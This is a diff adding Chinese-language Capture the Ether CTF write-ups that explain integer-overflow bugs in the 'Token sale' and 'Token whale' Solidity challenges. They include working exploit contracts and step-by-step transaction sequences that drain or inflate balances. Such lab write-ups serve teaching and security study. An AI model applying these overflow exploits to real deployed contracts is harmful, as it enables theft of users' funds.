@@ -357,3 +357,279 @@ contract PredictTheBlockHashChallenge {
 ![](.gitbook/assets/blockchain-ctf-predictHash.png)
 
 故只需要answer=0，并等待最新的区块比调用函数时的区块大256时即可。
+
+## Math
+
+## [Token sale](https://capturetheether.com/challenges/math/token-sale/)
+
+* 题目
+
+  ```
+  pragma solidity ^0.4.21;
+  
+  contract TokenSaleChallenge {
+      mapping(address => uint256) public balanceOf;
+      uint256 constant PRICE_PER_TOKEN = 1 ether;
+  
+      function TokenSaleChallenge(address _player) public payable {
+          require(msg.value == 1 ether);
+      }
+  
+      function isComplete() public view returns (bool) {
+          return address(this).balance < 1 ether;
+      }
+  
+      function buy(uint256 numTokens) public payable {
+          require(msg.value == numTokens * PRICE_PER_TOKEN);
+  
+          balanceOf[msg.sender] += numTokens;
+      }
+  
+      function sell(uint256 numTokens) public {
+          require(balanceOf[msg.sender] >= numTokens);
+  
+          balanceOf[msg.sender] -= numTokens;
+          msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
+      }
+  }
+  ```
+
+  
+
+* Write-Up
+
+没有溢出保护，构造溢出。
+
+思路：构造溢出有两种思路。
+
+1. 第一种思路是希望在`sell(uint256 numTokens)`中构造溢出，即思路是卖比实际价值更少的代币，获得更多的以太。
+
+   这里能溢出的地方只有
+
+   > balanceOf[msg.sender] -= numTokens; 
+   >
+   > 和
+   >
+   >  numTokens * PRICE_PER_TOKEN
+
+   若构造减法溢出，即希望`balanceOf[msg.sender]`被负溢出，成为一个极大的值。但是由于`require(balanceOf[msg.sender] >= numTokens);`，该溢出无法做到。
+
+   若构造乘法溢出，即希望`numTokens * PRICE_PER_TOKEN`溢出，得到一个极小的值。这样反而得到的以太变少了。
+
+   故不在`sell(uint256 numTokens)`中构造溢出。
+
+   
+
+2. 第一种是在`buy(uint256 numTokens)`中构造溢出。
+
+   这里同样有两处可以溢出。
+
+   >numTokens * PRICE_PER_TOKEN
+   >
+   >和
+   >
+   >balanceOf[msg.sender] += numTokens;
+   
+   若构造`balanceOf[msg.sender] += numTokens;`的溢出，仍然无意义。
+   
+   正确溢出构造：构造`buy(uint256 numTokens)`中的`numTokens * PRICE_PER_TOKEN`溢出。
+   
+   即构造大数`numToken。`使得`numTokens * PRICE_PER_TOKEN`溢出，得到一个极小值。最终的结果是用极少量的钱购买了大量代币。
+   
+   本次攻击合约如下：
+
+```
+pragma solidity ^0.4.21;
+
+contract TokenSaleChallenge {
+...
+}
+
+contract exploit {
+    address addrContractToken;
+    uint256 constant PRICE_PER_TOKEN = 1 ether;
+
+    function attackerBuy(address addr) public payable {
+
+        addrContractToken = addr;
+
+        uint256 makeOverflow = 2**256-1;
+        uint256 overflowNumTokens = makeOverflow / PRICE_PER_TOKEN + 1;
+
+        TokenSaleChallenge contractToken = TokenSaleChallenge(addrContractToken);
+        contractToken.buy.value(415992086870360064)(overflowNumTokens);
+
+    }
+
+    function attackerSell()public{
+        TokenSaleChallenge contractToken = TokenSaleChallenge(addrContractToken);
+        contractToken.sell(1);
+    }
+
+    function () public payable{
+        
+    }
+
+}
+```
+
+​		攻击步骤：
+
+1. 执行`attackerBuy(address addr)`，并附带415992086870360064 Wei
+
+   `addr`是挑战合约的地址，`overflowNumTokens`即我们构造的大数。它和`PRICE_PER_TOKEN`相乘后会溢出，得到一个不到1 ether 的值。该值经过事先计算，为415992086870360064。
+
+2. 执行attackerSell()
+
+## [Token whale](https://capturetheether.com/challenges/math/token-whale/)
+
+* 题目
+
+```
+pragma solidity ^0.4.21;
+
+contract TokenWhaleChallenge {
+    address player;
+
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    string public name = "Simple ERC20 Token";
+    string public symbol = "SET";
+    uint8 public decimals = 18;
+
+    function TokenWhaleChallenge(address _player) public {
+        player = _player;
+        totalSupply = 1000;
+        balanceOf[player] = 1000;
+    }
+
+    function isComplete() public view returns (bool) {
+        return balanceOf[player] >= 1000000;
+    }
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    function _transfer(address to, uint256 value) internal {
+        balanceOf[msg.sender] -= value;
+        balanceOf[to] += value;
+
+        emit Transfer(msg.sender, to, value);
+    }
+
+    function transfer(address to, uint256 value) public {
+        require(balanceOf[msg.sender] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+
+        _transfer(to, value);
+    }
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    function approve(address spender, uint256 value) public {
+        allowance[msg.sender][spender] = value;
+        emit Approval(msg.sender, spender, value);
+    }
+
+    function transferFrom(address from, address to, uint256 value) public {
+        require(balanceOf[from] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+        require(allowance[from][msg.sender] >= value);
+
+        allowance[from][msg.sender] -= value;
+        _transfer(to, value);
+    }
+}
+```
+
+* Write-Up
+
+  这个合约有一个最大的漏洞在`transferFrom(address from, address to, uint256 value)`中，这个函数只对from地址做了值上的判断，但是实际的转账是调用了`_transfer(address to, uint256 value)，如下：`
+
+  ```
+  function _transfer(address to, uint256 value) internal {
+          balanceOf[msg.sender] -= value;
+          balanceOf[to] += value;
+  
+          emit Transfer(msg.sender, to, value);
+      }
+  ```
+
+  实际转账是从`msg.sender`转到`to`。这样可以实现`msg.sender`的余额小于`value`仍然可以做减法，造成负溢出。
+
+  我们需要编写的只有一个工具合约，用来作为接收代币的工具人。工具合约如下，我们把部署后该合约的地址称作`toolContractAddr`：
+
+  ```
+  pragma solidity ^0.4.21;
+  
+  contract TokenWhaleChallenge {
+  ...
+  }
+  
+  contract toolContract{
+      function approve(address player,address addrContractToken, uint256 value){
+          TokenWhaleChallenge contractToken = TokenWhaleChallenge(addrContractToken);
+          contractToken.approve(player,value);
+      }
+  }
+  ```
+
+  接下来就是人工操作进行攻击。
+
+  1. 向`TokenWhaleChallenge`合约发送`approve(toolContractAddr，1000)`
+
+     [为了许可向工具合约转移所有已有代币。数量至少1000。]
+
+     
+
+  2. 向`toolContract`合约发送`approve(自己的地址,挑战合约地址,1)`
+
+     [为了许可后续负溢出操作的转账行为，数量随便多少。最小只需要允许给自己的地址转一个代币即可做到负溢出。]
+
+     
+
+  3. 向`TokenWhaleChallenge`合约发送`transfer(toolContractAddr，1000)`
+
+     [把所有代币转移到工具合约处。为后续的负溢出操作做准备。此时自己的地址已经没有代币了。]
+
+     
+
+  4. 向`TokenWhaleChallenge`合约发送`transferfrom(toolContractAddr,toolContractAddr,1)`
+
+     [负溢出操作。]
+
+     该操作的具体原理如下：
+
+     ```
+     function transferFrom(toolContractAddr,  toolContractAddr, 1) public {
+     
+     		//toolContractAddr的余额为1000，大于1。通过。
+             require(balanceOf[from] >= value);
+             
+             //toolContractAddr的余额 1000 + 1 = 1001，没有正溢出。通过。
+             require(balanceOf[to] + value >= balanceOf[to]);
+             
+             //经过第2步allowance[from][msg.sender]为1，大于等于1.通过。
+             require(allowance[from][msg.sender] >= value);
+     
+             allowance[from][msg.sender] -= value;
+             _transfer(to, value);
+         }
+         
+     function _transfer(toolContractAddr, 1) internal {
+     		// balanceOf[msg.sender]此时由于第3步的转账，已经等于0，减一之后负溢出。
+             balanceOf[msg.sender] -= value;
+             
+             balanceOf[to] += value;
+     
+             emit Transfer(msg.sender, to, value);
+         }  
+     ```
+
+     当然第3步也可以不把所有代币转完，只要第4步多转点就行了。但是要注意工具合约的余额是否大于负溢出所需要的数量。第1,2步也需要改变数量。
+
+  ## [Retirement fund](https://capturetheether.com/challenges/math/retirement-fund/)
+
+  
+
